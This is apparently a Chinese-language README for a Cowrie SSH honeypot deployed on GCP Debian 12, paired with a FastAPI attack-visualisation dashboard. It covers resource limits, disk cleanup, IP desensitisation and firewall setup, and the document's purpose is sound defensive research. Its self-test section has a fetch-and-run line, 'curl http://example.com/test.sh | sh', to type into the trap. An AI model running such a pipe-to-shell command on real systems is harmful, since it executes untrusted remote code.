# 🛡️ GCP Debian 12 极简轻量级 SSH 蜜罐与攻击态势感知可视化大屏

本项目针对 **Google Cloud Platform (GCP)** 的 **Debian 12 (Bookworm, x86_64)**、**n2-standard-2 (2 vCPU / 8 GB RAM)** 规格、**10GB 紧凑型系统盘** 以及 **Spot 可抢占实例** 进行了全方位的系统级与容器级优化。

---

## 🎯 核心优化与设计特性

| 关键约束 / 场景 | 专项设计方案与落地措施 |
| :--- | :--- |
| **系统盘仅 10GB（极度受限）** | 1. **Docker 日志滚动驱动**：限制单容器日志 `max-size: "50m"`, `max-file: "2"`。<br/>2. **样本与历史日志自动清理**：内置 `cleanup_disk.sh` 脚本与系统 cron，3 天清理下载样本，7 天归档日志。<br/>3. **SQLite 自动修剪**：后台常驻定时修剪 7 天前记录并自动 `VACUUM`，库体积始终控制在 50MB 以内。 |
| **Spot 可抢占实例（随时重启）** | 1. **容器秒级自愈**：所有服务配置 `restart: always`，随 GCP 抢占重启自动引导拉起。<br/>2. **配置 2GB Swapfile**：防止突发大流量爆破时触发 Linux 内核 OOM Killer。 |
| **CPU 防耗尽与恶意死循环** | 1. **容器资源硬限制**：Cowrie 容器限额 `limits.cpus: '1.2'`, `limits.memory: 2048M`。<br/>2. 宿主机与监控后端保留至少 0.8 vCPU，绝不卡死系统管理通道。 |
| **低风险端口策略** | 蜜罐监听主机 **`2222`** 端口，**100% 保留原生 22 端口给系统真实运维 SSH**，运维无忧。 |
| **数据安全与宿主机真实 IP 深度脱敏** | 接口输出与 WebSocket 实时广播前，通过脱敏引擎深度过滤 GCP 内网 IP（`10.x.x.x`）及宿主机公网 IP，一律替换为虚拟探针名称（`Honeypot-Node-01`）。 |

---

## 📁 工程目录结构

```text
.
├── deploy.sh                       # 🚀 真正的一键全自动部署脚本 (自动完成环境配置、Swap、权限与启动)
├── docker-compose.yml              # 容器编排 (含资源限制、日志驱动与 restart: always)
├── .env.example / .env             # 运行配置 (端口 2222、探针名、经纬度、数据保留天数)
├── README.md                       # GCP Debian 12 专用部署与安全运维手册
├── backend/
│   ├── Dockerfile                  # Python 3.11 镜像构建文件 (集成健康检查)
│   ├── requirements.txt            # FastAPI, aiosqlite, geoip2, httpx, uvicorn 等依赖
│   └── app/
│       ├── config.py               # 环境变量与虚拟探针配置
│       ├── database.py             # aiosqlite 异步数据库连接池与 Top 指标聚合
│       ├── desensitize.py          # 宿主机公网与 GCP VPC 内网 IP (10.x.x.x) 强脱敏引擎
│       ├── cleaner.py              # 10GB 磁盘保护常驻维护线程 (定时修剪 DB 与下载样本)
│       ├── geoip.py                # 双轨 IP 定位引擎 (本地 MMDB + API 回退 + SQLite 永久缓存)
│       ├── log_watcher.py          # 智能兼容监听 cowrie.json.log / cowrie.json 异步追踪器
│       ├── mock_generator.py       # 内置全球僵尸网络模拟攻击器
│       ├── websocket_manager.py    # WebSocket 客户端池与事件广播
│       └── main.py                 # FastAPI 路由、WebSocket 端点与前端静态托管
├── frontend/
│   ├── index.html                  # 响应式赛博暗黑风 SOC 态势大屏
│   ├── css/style.css               # 自定义荧光边框、玻璃拟态、终端发光动效
│   └── js/
│       ├── charts.js               # ECharts 5 全球攻击飞线与弱口令排行柱图渲染
│       ├── app.js                  # WebSocket 实时通信、HUD 计数器、雷达音效
│       └── world.json              # 离线打包全球暗黑矢量地图 (免外部依赖)
└── scripts/
    ├── gcp_setup.sh                # GCP Debian 12 基础依赖安装脚本
    ├── cleanup_disk.sh             # 10GB 磁盘保护定时修剪脚本 (Crontab 每日调度)
    ├── download_geoip.sh           # 自动化下载免费 DB-IP / GeoLite2 离线库脚本
    └── test_pipeline.py            # 数据管道与脱敏逻辑自动化测试套件
```

---

## ⚡ 极简【一键全自动部署】（推荐）

在你的 GCP Debian 12 终端中，只需执行这一行指令：

```bash
sudo bash deploy.sh
```

**该脚本会全自动为您处理一切，全程无需人工干预：**
1. 自动探测并获取当前 GCP 实例的公网 IP；
2. 自动安装 Docker CE 及 Docker Compose 插件；
3. 自动创建并挂载 2GB Swapfile（抵御 Spot 抢占突发流量）；
4. 自动修复 Cowrie (UID 1000) 权限与生成脱敏配置 `.env`；
5. 自动向系统 Crontab 注册 10GB 磁盘每日自动清理任务；
6. 自动构建镜像并启动后台容器；
7. 自动执行健康检查，并在终端打印可视化大屏访问地址与测试命令！

---

## 🚀 GCP 部署完整步骤说明

### 第一步：创建 GCP 防火墙规则 (VPC Firewall)

在 Google Cloud Shell 或本地使用 `gcloud` 命令行创建针对蜜罐和可视化大屏的访问规则（或者直接在 GCP Web 控制台配置）：

```bash
# 1. 蜜罐 SSH 端口 (2222): 允许来自公网全网的扫描与爆破流量
gcloud compute firewall-rules create allow-honeypot-ssh \
    --direction=INGRESS \
    --priority=1000 \
    --network=default \
    --action=ALLOW \
    --rules=tcp:2222 \
    --source-ranges=0.0.0.0/0 \
    --target-tags=honeypot-node \
    --description="Allow public SSH scanning to Cowrie Honeypot"

# 2. 态势感知大屏端口 (8080): 强烈建议限制仅限管理员公网 IP 访问
# 请将 YOUR_ADMIN_IP 替换为您当前的出口公网 IP (可在 ipinfo.io 查看)
gcloud compute firewall-rules create allow-soc-dashboard \
    --direction=INGRESS \
    --priority=1000 \
    --network=default \
    --action=ALLOW \
    --rules=tcp:8080 \
    --source-ranges=YOUR_ADMIN_IP/32 \
    --target-tags=honeypot-node \
    --description="Allow admin access to SOC Dashboard Web UI"
```

> **提示**：确保您的 GCP Compute Engine 虚拟机实例添加了网络标记（Network tag）：`honeypot-node`。

---

### 第二步：登录 GCP Debian 12 实例并一键初始化环境

1. 通过原生 SSH 登录您的 GCP 实例：
   ```bash
   gcloud compute ssh your-instance-name --zone=your-zone
   ```
2. 进入项目代码目录，执行自带的初始化脚本：
   ```bash
   cd ssh-honeypot-soc
   sudo bash ./scripts/gcp_setup.sh
   ```
   **该脚本会自动为您完成：**
   - 更新 Debian 12 系统并安装 Docker Engine & Docker Compose Plugin (v2)；
   - 自动创建并启用 **2GB Swap 分区**（`vm.swappiness=10`），抵抗 Spot 实例内存波动；
   - 创建数据持久化目录并赋予 Cowrie (UID 1000) 正确的文件写入权限；
   - 在系统 Crontab 中注册每日凌晨 3:00 自动执行的 `cleanup_disk.sh` 磁盘清理任务。

---

### 第三步：配置环境变量并一键拉起容器

1. 复制环境变量并微调：
   ```bash
   cp .env.example .env
   ```
2. （可选）在 `.env` 中填入你的 GCP 实例公网 IP，增强脱敏：
   ```ini
   HOST_REAL_IP=34.120.x.x
   ```
3. 一键启动 Docker 编排服务：
   ```bash
   docker compose up -d --build
   ```

---

### 第四步：访问态势大屏与攻击验证

1. **打开大屏**：
   浏览器访问：**`http://<GCP实例公网IP>:8080`**
2. **即时功能自测**：
   - 点击右上角 **`💥 TEST ATTACK`**：立即触发模拟单次攻击飞线。
   - 点击 **`⚡ DEMO: OFF`** 切换为 **`ON`**：开启全自动全球僵尸网络模拟攻击流。
   - 点击 **`🔊 SOUND`**：开启真实 SOC 雷达探测脉冲音效。
3. **向蜜罐发起真实 SSH 攻击**：
   ```bash
   # 连接蜜罐 2222 端口 (密码随意输入，如 123456)
   ssh root@<GCP实例公网IP> -p 2222

   # 成功诱捕后敲入测试命令：
   uname -a
   cat /proc/cpuinfo
   curl http://example.com/test.sh | sh
   exit
   ```
   大屏将在 **1 秒内** 滚动终端日志、在世界地图绘制飞线，并在底部审计区记录执行的指令！

---

## 🔒 10GB 磁盘运维与容量监控

### 1. 手动运行磁盘清理
```bash
sudo ./scripts/cleanup_disk.sh
```

### 2. 检查磁盘占用状态
```bash
df -h /
docker system df
```

### 3. 查看容器实时资源占用
```bash
docker stats
```
您会看到 Cowrie 被严格限制在 1.2 CPU 和 2GB 内存以内，无论黑客在蜜罐中执行何种死循环或编译挖矿，均不会打垮宿主机。

---

## 📜 许可证与免责声明

本项目仅供网络安全防御研究、威胁情报收集以及态势感知可视化教学使用。请勿在未取得合法授权的环境中利用蜜罐技术从事非授权数据捕获。
